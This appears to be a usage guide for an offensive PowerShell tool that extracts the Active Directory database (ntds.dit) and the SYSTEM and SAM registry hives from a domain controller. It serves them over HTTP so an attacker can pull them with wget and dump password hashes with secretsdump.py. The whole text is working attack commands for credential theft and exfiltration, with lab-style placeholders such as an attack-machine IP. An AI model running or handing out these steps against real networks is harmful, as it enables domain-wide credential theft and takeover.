#This is for the ntds_extractor.ps1 

🌐 HTTP Server Integration:
After extraction, the script will prompt to start an HTTP server. On your Kali/attack machine:
bash# Download all files
wget http://<DC_IP>:8000/ntds.dit
wget http://<DC_IP>:8000/SYSTEM
wget http://<DC_IP>:8000/SAM

# Or one-liner
for f in ntds.dit SYSTEM SAM; do wget http://<DC_IP>:8000/$f; done

# Then extract hashes
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

📋 Usage:
powershell# Extract + auto-start HTTP server
.\ntds_extractor.ps1 -ServeFiles

# With specific IP
.\ntds_extractor.ps1 -ServeFiles -ServeIP 10.10.14.5

# Custom port
.\ntds_extractor.ps1 -ServeFiles -ServePort 9000

# Extract only (no server prompt)
.\ntds_extractor.ps1 -ExtractOnly
```
